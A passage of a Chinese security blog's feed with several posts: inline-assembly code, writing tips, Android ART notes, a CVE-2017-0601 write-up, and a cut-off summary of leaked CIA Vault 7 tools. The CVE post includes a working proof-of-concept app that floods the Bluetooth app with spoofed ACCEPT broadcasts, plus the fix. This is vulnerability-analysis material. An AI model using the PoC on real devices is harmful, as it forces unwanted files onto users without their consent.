<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">#ifdef __amd64__</div><div class="line">    __asm__ __volatile__ ( &quot;mov %0, %%rbx;&quot;</div><div class="line">        &quot;movl $1, (%%rbx);&quot;</div><div class="line">        &quot;add $1, (%%rbx);&quot;     &quot;add $1, (%%rbx);&quot;</div><div class="line">        &quot;add $1, (%%rbx);&quot;     &quot;add $1, (%%rbx);&quot;</div><div class="line">        &quot;add $1, (%%rbx);&quot;     &quot;add $1, (%%rbx);&quot;</div><div class="line">        &quot;add $1, (%%rbx);&quot;     &quot;add $1, (%%rbx);&quot;</div><div class="line">        &quot;add $1, (%%rbx);&quot;     &quot;add $1, (%%rbx);&quot;</div><div class="line">        &quot;add $1, (%%rbx);&quot;     &quot;add $1, (%%rbx);&quot;</div><div class="line">        &quot;add $1, (%%rbx);&quot;     &quot;add $1, (%%rbx);&quot;</div><div class="line">        &quot;add $1, (%%rbx);&quot;     &quot;add $1, (%%rbx);&quot;</div><div class="line">        &quot;add $1, (%%rbx);&quot;     &quot;add $1, (%%rbx);&quot;</div><div class="line">        &quot;add $1, (%%rbx);&quot;</div><div class="line">        :</div><div class="line">        :&quot;c&quot;(&amp;global_value)</div><div class="line">    );</div><div class="line">#endif</div><div class="line">#ifdef __arm__</div><div class="line">    __asm__ __volatile__ (&quot;mov r0, %[global];&quot;</div><div class="line">        &quot;mov r1, #1;&quot;</div><div class="line">        &quot;add r1, r1, #1;&quot; &quot;str r1, [r0];&quot;</div><div class="line">        &quot;add r1, r1, #1;&quot; &quot;str r1, [r0];&quot;</div><div class="line">        &quot;add r1, r1, #1;&quot; &quot;str r1, [r0];&quot;</div><div class="line">        :</div><div class="line">        :[global] &quot;r&quot; (&amp;global_value)</div><div class="line">        );</div><div class="line">#endif</div><div class="line">#ifdef __i386__</div><div class="line">    __asm__ __volatile__ (</div><div class="line">        &quot;movl %0, %%ebx;&quot;</div><div class="line">        &quot;movl $1, (%%ebx);&quot;</div><div class="line">        &quot;add $1, (%%ebx);&quot;</div><div class="line">        &quot;add $1, (%%ebx);&quot;</div><div class="line">        :</div><div class="line">        :&quot;c&quot;(&amp;global_value)</div><div class="line">        );</div><div class="line">#endif</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;转载自：&lt;a href=&quot;http://www.voidcn.com/blog/beyond702/article/p-6152486.html&quot;&gt;Arm汇编学习笔记(三)——GCC内联汇编&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="C" scheme="http://yoursite.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>如何提高技术类文章写作水平？</title>
    <link href="http://yoursite.com/2017/05/17/%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98%E6%8A%80%E6%9C%AF%E5%86%99%E4%BD%9C%E6%B0%B4%E5%B9%B3%EF%BC%9F/"/>
    <id>http://yoursite.com/2017/05/17/如何提高技术写作水平？/</id>
    <published>2017-05-17T06:31:30.000Z</published>
    <updated>2017-05-23T13:28:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>本文的观点参考　知乎－<a href="https://www.zhihu.com/question/20896970" target="_blank" rel="external">《可以从哪些方面加强技术博客的写作能力？》</a> </p>
<a id="more"></a>
<blockquote>
<p>做技术时间长了发现如果没有好的写作习惯真的不行。</p>
</blockquote>
<p>首先，如果不通过写作分享做过的技术，那么自己对技术本身的理解可能就处在一种模糊的状态。写作的过程就是，<font color="red" size="4"><strong>我理解技术的原理，现在我要告诉别人，以后告诉我自己</strong></font>; 其次，就是工作产出大部分都是以文档+代码的形式，代码几乎都是自己看所以要把文档写好。</p>
<blockquote>
<p>如果写了但是自己都不愿意看，那写的东西就没有了意义，所以要提高写作水平。</p>
</blockquote>
<p><strong>如何提高写作水平</strong> 是本文要重点讨论的问题，这里不展开。不过在写作之前，自己心中就有一个想法 <strong> 我写的东西要实用，　要简洁</strong>。</p>
<h1 id="衡量水平"><a href="#衡量水平" class="headerlink" title="衡量水平"></a>衡量水平</h1><p>初学者写文章开始人物、时间、地点、事件四要素都不能齐全，写不出长的文章，自己所谓的原创就是几个互不相干的句子组合而成；待水平提高后，能写长一点的文章，但是拖泥带水，干货太少，写了很多可以直接删除的东西，大多数人居于这个写作层次；写作水平再上一个台阶，又会发现动笔就是长文，洋洋洒洒地几千字甚至上万仍意犹未尽，且行文流畅，这时候写作水平已经基本合格了，但是文章该是有长有短，这个水平阶段写不了短小精干的短文；如果写作水平能再前进一步，则是能长能短、能硬能软、能屈能伸……别想歪了。</p>
<p>毫无疑问，笔者在初级。。。。</p>
<h1 id="改进的方法"><a href="#改进的方法" class="headerlink" title="改进的方法"></a>改进的方法</h1><ol>
<li>看一些入门写作的书，学习基础技巧。控制<code>上下文不连贯，语病，乱用标点</code></li>
<li>动笔前，要理清思路，明确自己想要说什么，想表达什么意思。</li>
<li>动笔时，行文要流畅，章节要分清，有主有次；减少病句出现；合适用词，正确使用标点符号。</li>
<li>动笔后，检查再检查。当初我刚写作时候，我就是每次写完，打印出来修改上5、6遍。以后写作水平提高了就可以偷工减料了。</li>
<li>练。三天不写手生，那也不是瞎练。你的博客可以吹水咯屁，但是隔那么几天得有一两篇是认认真真写出来的，那么不出三个月，写作水平会大有提高。</li>
<li>看，模仿。可以看看公知的文章，看看他们怎么写的，思索如果自己动笔写会怎样写。</li>
<li>总结公知擅长的<code>甩包袱, 俏皮话</code></li>
<li>博览群书</li>
</ol>
<h1 id="Todo"><a href="#Todo" class="headerlink" title="Todo　"></a>Todo　</h1><ol>
<li>[维护] 文字片段(上面第７点)</li>
<li>一年读书不少于10本</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;本文的观点参考　知乎－&lt;a href=&quot;https://www.zhihu.com/question/20896970&quot;&gt;《可以从哪些方面加强技术博客的写作能力？》&lt;/a&gt; &lt;/p&gt;
    
    </summary>
    
      <category term="生活" scheme="http://yoursite.com/categories/categories-life/"/>
    
    
      <category term="软实力" scheme="http://yoursite.com/tags/%E8%BD%AF%E5%AE%9E%E5%8A%9B/"/>
    
  </entry>
  
  <entry>
    <title>Android ART 虚拟机学习(一) -- 框架/模块</title>
    <link href="http://yoursite.com/2017/05/15/Android-ART-%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AD%A6%E4%B9%A0-%E4%B8%80-%E6%A1%86%E6%9E%B6-%E6%A8%A1%E5%9D%97/"/>
    <id>http://yoursite.com/2017/05/15/Android-ART-虚拟机学习-一-框架-模块/</id>
    <published>2017-05-15T14:03:37.000Z</published>
    <updated>2017-05-23T13:18:53.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>学习老罗的文章，简单记录一下<br><a href="http://blog.csdn.net/luoshengyang/article/details/39256813" target="_blank" rel="external">Android运行时ART简要介绍和学习计划</a><br><a id="more"></a></p>
<h1 id="Dalvik"><a href="#Dalvik" class="headerlink" title="Dalvik"></a>Dalvik</h1><p>JIT (just in time)执行本地机器指令<br>尽管Dalvik也会对频繁执行的代码进行JIT生成本地机器指令来执行，但毕竟在应用程序运行的过程中将Dex字节码翻译成本地机器指令也会影响到应用程序本身的执行，因此即使Dalvik使用了JIT，也在一定程度上也比不上直接就可以执行本地机器指令的运行时。</p>
<h1 id="ART"><a href="#ART" class="headerlink" title="ART"></a>ART</h1><p>Java 虚拟机接口 + 垃圾回收</p>
<p>APK 安装时走 AOT 流程<br>AOT(Ahead of Time)相对 Jit而言。AOT 要求 apk 安装时就要编译成本地机器指令。</p>
<h2 id="LLVM"><a href="#LLVM" class="headerlink" title="LLVM"></a>LLVM</h2><p>在ART中，打包在APK里面的Dex字节码是通过LLVM翻译成本地机器指令的。LLVM是一个用来快速开发自己的编译器的框架系统。</p>
<p>基于LLVM架构开发的编译器的执行过程如图2所示</p>
<p><img src="/include/img/LLVM.png" alt="LLVM.png"></p>
<ul>
<li><p>前端工具：对输入的源代码（Source Code）进行语法分析后，生成一棵抽象语法树（Abstract Syntax Tree，AST），并且可以进一步将得到的抽象语法树转化一种称为LLVM IR的中间语言。LLVM IR是一种与编程语言无关的中间语言</p>
</li>
<li><p>优化器：优化器对LLVM IR文件进行优化，例如消除代码里面的冗余计算</p>
</li>
<li>后端工具：后端负责生成最终的机器指令。</li>
</ul>
<p><img src="/include/img/LLVM2.png" alt="LLVM.png"></p>
<h2 id="dalvik-优化-dex-到-odex"><a href="#dalvik-优化-dex-到-odex" class="headerlink" title="dalvik 优化 dex 到 odex"></a>dalvik 优化 dex 到 odex</h2><p>APK在安装的时候，安装服务PackageManagerService会通过守护进程installd调用一个工具dexopt对打包在APK里面包含有Dex字节码的classes.dex进行优化，优化得到的文件保存在/data/dalvik-cache目录中，并且以.odex为后缀名，表示这是一个优化过的Dex文件。</p>
<h2 id="art-优化-dex-到本地机器指令-还保存为以前的-odex-文件）"><a href="#art-优化-dex-到本地机器指令-还保存为以前的-odex-文件）" class="headerlink" title="art 优化 dex 到本地机器指令 (还保存为以前的 odex 文件）"></a>art 优化 dex 到本地机器指令 (还保存为以前的 odex 文件）</h2><p>在ART运行时中，APK在安装的时候，同样安装服务PackageManagerService会通过守护进程installd调用另外一个工具dex2oat对打包在APK里面包含有Dex字节码进翻译。这个翻译器实际上就是基于LLVM架构实现的一个编译器，它的前端是一个Dex语法分析器。翻译后得到的是一个ELF格式的oat文件，这个oat文件同样是以.odex后缀结束，并且也是保存在/data/dalvik-cache目录中。</p>
<h2 id="oat-文件格式"><a href="#oat-文件格式" class="headerlink" title="oat 文件格式"></a>oat 文件格式</h2><p>oat 比正常的 ELF 可执行文件多了 oatdata 和 oatexec段。</p>
<ul>
<li>oatdata 段 保存apk 中原始的 dex 文件</li>
<li>oatexec 段 保存翻译过后的 机器指令</li>
</ul>
<p><img src="/include/img/oat.png" alt="图4 ART翻译classes.dex后得到的ELF格式的oat文件"></p>
<p>后续内容：<br>ART加载oat文件的过程。<br>ART查找类和方法的过程。<br>ART查找类方法的本地机器指令的过程。<br>Dalvik虚拟机的垃圾收集过程。<br>ART的垃圾收集过程。</p>
<h1 id="Android-ART运行时无缝替换Dalvik虚拟机的过程分析"><a href="#Android-ART运行时无缝替换Dalvik虚拟机的过程分析" class="headerlink" title="Android ART运行时无缝替换Dalvik虚拟机的过程分析"></a><a href="http://blog.csdn.net/luoshengyang/article/details/18006645" target="_blank" rel="external">Android ART运行时无缝替换Dalvik虚拟机的过程分析</a></h1><p>本文主要 结合源代码分析 art 替换 dalvik 需要做的工作。<br>总结下来就2部分：</p>
<ul>
<li>创建虚拟机 ART 虚拟机</li>
<li>将dex 翻译成 oat 的过程</li>
</ul>
<h2 id="创建虚拟机-ART-虚拟机"><a href="#创建虚拟机-ART-虚拟机" class="headerlink" title="创建虚拟机 ART 虚拟机"></a>创建虚拟机 ART 虚拟机</h2><p>这个过程要从 系统启动开始。</p>
<p>回忆一下 dalvik 虚拟的创建过程，是由 Zygote 进程完成，之后的所有进程都是从 zygote 孵化而来。</p>
<p><img src="/include/img/startVm.png" alt=""></p>
<h2 id="将dex-翻译成-oat-的过程"><a href="#将dex-翻译成-oat-的过程" class="headerlink" title="将dex 翻译成 oat 的过程"></a>将dex 翻译成 oat 的过程</h2><ul>
<li>在安装 apk 时会进行一次对待安装 app 的翻译</li>
<li>在系统启动时，会对 /system/app 、/data/app、/system/framework 目录下的 apk 或者 jar 文件，以及这些 APK 所引用的外部 JAR，进行 dex 到 oat 的翻译。</li>
</ul>
<p>上述2条翻译的路线都是从 PMS 开始，最后一直到生成 odex文件结束。</p>
<p><img src="/include/img/dex2oat.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;学习老罗的文章，简单记录一下&lt;br&gt;&lt;a href=&quot;http://blog.csdn.net/luoshengyang/article/details/39256813&quot;&gt;Android运行时ART简要介绍和学习计划&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="研究" scheme="http://yoursite.com/categories/categories-research/"/>
    
    
      <category term="ART虚拟机" scheme="http://yoursite.com/tags/ART%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
      <category term="Android OS" scheme="http://yoursite.com/tags/Android-OS/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-0601 Android 蓝牙app 漏洞</title>
    <link href="http://yoursite.com/2017/05/15/CVE-2017-0601-Android-%E8%93%9D%E7%89%99app-%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2017/05/15/CVE-2017-0601-Android-蓝牙app-漏洞/</id>
    <published>2017-05-15T03:54:55.000Z</published>
    <updated>2017-05-20T04:37:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<h3 id="关注重点："><a href="#关注重点：" class="headerlink" title="关注重点："></a>关注重点：</h3><ul>
<li><a href="https://my.oschina.net/zhoulc/blog/114507" target="_blank" rel="external">Android系统蓝牙模块设计</a></li>
<li>漏洞类型: App 权限控制不严，导致本地越权接收远程文件</li>
<li>漏洞代码：<a href="http://androidxref.com/7.0.0_r1/xref/packages/apps/Bluetooth/src/com/android/bluetooth/opp/BluetoothOppReceiver.java" target="_blank" rel="external">Android 7.0 BlueTooth App</a></li>
</ul>
<a id="more"></a>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h2 id="影响的机型"><a href="#影响的机型" class="headerlink" title="影响的机型"></a>影响的机型</h2><p>只对7.0 以后的系统的有影响：</p>
<ul>
<li>7.0</li>
<li>7.1.1</li>
<li>7.1.2</li>
</ul>
<h2 id="基本描述"><a href="#基本描述" class="headerlink" title="基本描述"></a>基本描述</h2><p>CVE-2017-0601 蓝牙App暴露了一个广播接收器<br><code>com.android.bluetooth.opp.BluetoothOppReceiver</code>，本地普通App可以向这个Receiver发送广播，<code>android.btopp.intent.action.ACCEPT</code> action 允许绕过用户操作主动接受 文件。</p>
<h1 id="漏洞分析-POC"><a href="#漏洞分析-POC" class="headerlink" title="漏洞分析/POC"></a>漏洞分析/POC</h1><p><a href="https://xianzhi.aliyun.com/forum/read/1570.html" target="_blank" rel="external">[移动安全]【独家】原创蓝牙App漏洞系列分析之一CVE20170601</a></p>
<p>漏洞代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">public void onReceive(Context context, Intent intent) &#123;</div><div class="line">       String action = intent.getAction();</div><div class="line"></div><div class="line">       if (action.equals(BluetoothAdapter.ACTION_STATE_CHANGED)) &#123;</div><div class="line">               // If this is within a sending process, continue the handle</div><div class="line">               // logic to display device picker dialog.</div><div class="line"></div><div class="line">               ....</div><div class="line">           &#125;</div><div class="line">       &#125; else if (action.equals(Constants.ACTION_ACCEPT)) &#123;</div><div class="line">           //ACTION_ACCEPT = &quot;android.btopp.intent.action.ACCEPT&quot;;</div><div class="line">           if (V) Log.v(TAG, &quot;Receiver ACTION_ACCEPT&quot;);</div><div class="line"></div><div class="line">           Uri uri = intent.getData();</div><div class="line">           ContentValues values = new ContentValues();</div><div class="line">           values.put(BluetoothShare.USER_CONFIRMATION, BluetoothShare.USER_CONFIRMATION_CONFIRMED);</div><div class="line"></div><div class="line">           // 将Intent携带Uri指向的db进行更新，更新为用户确认状态</div><div class="line">           context.getContentResolver().update(uri, values, null, null);</div><div class="line">           cancelNotification(context, uri);</div><div class="line">       &#125;</div></pre></td></tr></table></figure></p>
<p>上面的代码是 7.0 系统中，在6.0.1 不存在<code>Constants.ACTION_ACCEPT</code>.</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line">public class MainActivity extends AppCompatActivity &#123;</div><div class="line"></div><div class="line">    ToggleButton toggleButton;</div><div class="line">    Context ctx = this;</div><div class="line">    public static final String ACTION_ACCEPT = &quot;android.btopp.intent.action.ACCEPT&quot;;</div><div class="line">    public static final String BLUETOOTH_SHARE_URI = &quot;content://com.android.bluetooth.opp/btopp/&quot;;</div><div class="line">    boolean Flag = false;</div><div class="line"></div><div class="line">    // 此POC 在 android 6.0.1 上测试没有效果</div><div class="line">    // https://xianzhi.aliyun.com/forum/read/1570.html</div><div class="line"></div><div class="line">    @Override</div><div class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</div><div class="line">        super.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line"></div><div class="line">        final Runnable mRunnable = new Runnable() &#123;</div><div class="line">            @Override</div><div class="line">            public void run() &#123;</div><div class="line">                try &#123;</div><div class="line">                    while (Flag) &#123;</div><div class="line">                        Intent intent = new Intent();</div><div class="line">                        intent.setComponent(new ComponentName(&quot;com.android.bluetooth&quot;,</div><div class="line">                                &quot;com.android.bluetooth.opp.BluetoothOppReceiver&quot;));</div><div class="line">                        intent.setAction(ACTION_ACCEPT);</div><div class="line">                        // Guess the incoming bluetooth share uri, normally it increases from 1 by 1 and could be guessed easily.</div><div class="line">                        // Then Send broadcast to change the incoming file status</div><div class="line">                        for (int i = 0 ; i &lt; 255; i++) &#123;</div><div class="line">                            String uriString = BLUETOOTH_SHARE_URI + Integer.toString(i);</div><div class="line">                            intent.setData(Uri.parse(uriString));</div><div class="line">                            sendBroadcast(intent);</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                &#125;catch (Exception e) &#123;</div><div class="line">                    e.printStackTrace();</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;;</div><div class="line"></div><div class="line">        toggleButton = (ToggleButton)findViewById(R.id.toggleButton);</div><div class="line">        toggleButton.setOnClickListener( new View.OnClickListener() &#123;</div><div class="line">            @Override</div><div class="line">            public void onClick(View view) &#123;</div><div class="line">                Thread thread = new Thread(mRunnable);</div><div class="line"></div><div class="line">                // turn on</div><div class="line">                if (toggleButton.isChecked()) &#123;</div><div class="line">                    Toast.makeText(ctx, &quot;checked&quot;, Toast.LENGTH_SHORT).show();</div><div class="line">                    Flag = true;</div><div class="line">                    thread.start();</div><div class="line"></div><div class="line"></div><div class="line">                &#125; else &#123;  //turn off</div><div class="line">                    Toast.makeText(ctx, &quot;not checked&quot;, Toast.LENGTH_SHORT).show();</div><div class="line">                    Flag = false;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p>将 bluetooth app 使用action 保护起来， 只允许系统应用发送该 action 的广播。参考：<a href="http://blog.csdn.net/taylorpotter/article/details/70194248" target="_blank" rel="external">protected-broadcast 系统应用自定义广播规范</a><br><code>framework/base/core/res/AndroidManifest.xml</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"> &lt;protected-broadcast android:name=&quot;android.btopp.intent.action.OPEN_INBOUND&quot; /&gt;</div><div class="line">     &lt;protected-broadcast android:name=&quot;android.btopp.intent.action.TRANSFER_COMPLETE&quot; /&gt;</div><div class="line">     &lt;protected-broadcast android:name=&quot;com.android.bluetooth.gatt.REFRESH_BATCHED_SCAN&quot; /&gt;</div><div class="line">+    &lt;protected-broadcast android:name=&quot;android.btopp.intent.action.ACCEPT&quot; /&gt;</div><div class="line">+    &lt;protected-broadcast android:name=&quot;android.btopp.intent.action.DECLINE&quot; /&gt;</div><div class="line">     &lt;protected-broadcast android:name=&quot;com.android.bluetooth.pbap.authchall&quot; /&gt;</div><div class="line">     &lt;protected-broadcast android:name=&quot;com.android.bluetooth.pbap.userconfirmtimeout&quot; /&gt;</div><div class="line">     &lt;protected-broadcast android:name=&quot;com.android.bluetooth.pbap.authresponse&quot; /&gt;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;关注重点：&quot;&gt;&lt;a href=&quot;#关注重点：&quot; class=&quot;headerlink&quot; title=&quot;关注重点：&quot;&gt;&lt;/a&gt;关注重点：&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://my.oschina.net/zhoulc/blog/114507&quot;&gt;Android系统蓝牙模块设计&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;漏洞类型: App 权限控制不严，导致本地越权接收远程文件&lt;/li&gt;
&lt;li&gt;漏洞代码：&lt;a href=&quot;http://androidxref.com/7.0.0_r1/xref/packages/apps/Bluetooth/src/com/android/bluetooth/opp/BluetoothOppReceiver.java&quot;&gt;Android 7.0 BlueTooth App&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://yoursite.com/categories/categories-exploit/"/>
    
    
      <category term="app漏洞" scheme="http://yoursite.com/tags/app%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="蓝牙" scheme="http://yoursite.com/tags/%E8%93%9D%E7%89%99/"/>
    
  </entry>
  
  <entry>
    <title>CIA 武器库</title>
    <link href="http://yoursite.com/2017/05/03/CIA-%E6%AD%A6%E5%99%A8%E5%BA%93/"/>
    <id>http://yoursite.com/2017/05/03/CIA-武器库/</id>
    <published>2017-05-03T00:53:14.000Z</published>
    <updated>2017-05-20T04:37:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>2017.3 月开始 维基解密陆续对 CIA 泄露出的数据进行曝光，截至目前已经曝光了3此。</p>
<p>本文特意将 曝光的内容进行整理。</p>
<ul>
<li>第一系列 — Year Zero （元年）</li>
<li>第二系列 — <a href="https://wikileaks.org/vault7/darkmatter/releases/" target="_blank" rel="external">Dark Matter</a></li>
<li>第三系列 — Marble 混淆工具</li>
</ul>
<a id="more"></a>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>第一系列应该是维基解密总结了所有情报以后对 CIA 间谍行为的汇总，这里大部分是介绍 CIA 有那些项目，项目的大概功能以及CIA 的组织架构。</p>
<p>第二系列 CIA 开发了 <a href="https://wikileaks.org/vault7/darkmatter/document/SonicScrewdriver_1p0/SonicScrewdriver_1p0.pdf" target="_blank" rel="external"><code>Sonic Screwdriver</code></a> 项目主要是开发向 MAC 和 iOS 设备的固件系统（UEFI、EFI）植入恶意软件或者利用漏洞达到监控用户的目的。</p>
<p>第三系列 提供了一套代码混淆的工具 Marble 的源码, <a href="https://mp.weixin.qq.com/s?__biz=MzAwNTI1NDI3MQ%3D%3D&amp;mid=2649612204&amp;idx=1&amp;sn=d05624a73eefd7c6bfa674b22e812e4d&amp;chksm=830602bcb4718baab293b75c598eb32fee653404eeaffd8b60f59d7d944bd283e01453c5243a&amp;mpshare=1&amp;scene=23&amp;srcid=042658zyrElHBz1TOxV2gN4X#rd" target="_blank" rel="external">网络上公开的分析报告</a></p>
<h1 id="组织架构"><a href="#组织架构" class="headerlink" title="组织架构"></a>组织架构</h1><p><img src="/include/img/cia_vault7.png" alt="CIA 机构划分"></p>
<h2 id="EBD："><a href="#EBD：" class="headerlink" title="EBD："></a>EBD：</h2><ul>
<li>BaldEagle：针对Unix系统硬件抽象层的HALdaemon漏洞利用工具；（vault7中出现次数：27）</li>
<li>MaddeningWhispers：针对Vanguard设备进行远程入侵的漏洞利用工具；（vault7中出现次数：34）</li>
<li>CRUCIBLE：自动化的可利用漏洞识别（automatedexploit identification）工具；（vault7中出现的次数：8）</li>
<li>YarnBall：在部署有效载荷或数据窃取时使用的隐蔽USB存储工具；（vault7中出现次数：43）</li>
<li>GreenPacket：针对GreenPacket路由设备进行木马植入的工具套装；（vault7中出现次数：11）</li>
<li>QuarkMatter：另一款针对OSX系统的启动驱动级植入木马；（vault7中出现次数：40）</li>
<li>Weeping Angel：由CIA和英国MI5共同开发的针对三星智能电视的木马植入工具组件。该窃听软件感染智能电视后，会劫持电视的关机操作，保持程序的后</li>
<li><p>运行，让用户误以为已经关机了，之后它会启动麦克风，开启录音功能，然后将录音内容回传到CIA的后台服务器；（vault7中出现次数：65）</p>
</li>
<li><p>Hive：针对Windows和UNIX系统，为其它攻击部署和工具提供入侵协助的组件平台；（vault7中出现次数：197）</p>
</li>
<li>Honeycomb：用于配合Hive，运行于linux系统的，针对Swindle或Blot代理服务器的数据收集处理脚本工具；（vault7中出现次数：78）</li>
<li>CutThroat：构建于代理服务器之上，用于向目标系统发送数据的虚拟机接口；（vault7中出现次数：232）</li>
<li>Bee Sting：用于HTTP连接中的iFrame注入工具；（vault7中出现次数：21）</li>
<li>Sontaran：用于针对西门子OpenStage数字电话进行入侵的工具；（vault7中出现次数：83）</li>
<li>Secret Squirrel (SQRL)：由远程研发部门RDB和嵌入式研发部门共同开发的工具，目前还不知晓具体用途 。</li>
</ul>
<h2 id="REB"><a href="#REB" class="headerlink" title="REB"></a>REB</h2><ul>
<li>Umbrage：一项团队模式的网络攻击平台，CIA技术人员通过该平台收集大量公开的黑客工具、攻击技术、一些泄露数据中包含的可用代码和相关思路方法，以此形成一个网络攻击特征库，可应用于网络攻击活动的调查取证。另据其* 它媒体报道，CIA可以通过该特征库采取模仿、混淆等多种战术，发起针对目标系统的“虚假标记”网络攻击，故意留下蛛丝马迹，让人作出错误判断，达到迷惑敌人、嫁祸于人，隐藏自己的目的。（vault7中出现次数：46）</li>
<li>ShoulderSurfer：从MicrosoftExchange中提取数据的工具；（vault7中出现次数：43）</li>
</ul>
<h2 id="OSB："><a href="#OSB：" class="headerlink" title="OSB："></a>OSB：</h2><ul>
<li><a href="http://www.freebuf.com/articles/system/133702.html" target="_blank" rel="external">Scribbles</a>: 这是一个文档预处理系统，用于给涉密文档打上“Web beacon”类型的追踪水印。</li>
<li>Time Stomper：用来在特定网络入侵行动中修改攻击载荷时间戳属性的工具；（vault7中出现次数：12）</li>
<li>Munge Payload：对攻击载荷进行加密和免杀处理的工具；（vault7中出现次数：65）</li>
<li>Magical Mutt：可以实现恶意DLL注入并能监控目标系统进程的工具；（vault7中出现次数：16）</li>
<li>Flash Bang：浏览器沙箱逃逸和劫持工具，当成功逃逸或劫持后，可以实现对目标系统的进一步提权操作；vault7中出现的次数：27</li>
<li>RickyBobby：以电影《塔拉德加之夜》中的角色RickyBobby命名，包含多种DLL攻击文件和执行脚本的一款轻量级的远控植入工具，可以实现对目标系统的端口监听、上传和下载和命令执行等功能；（vault7中出现次数：21）</li>
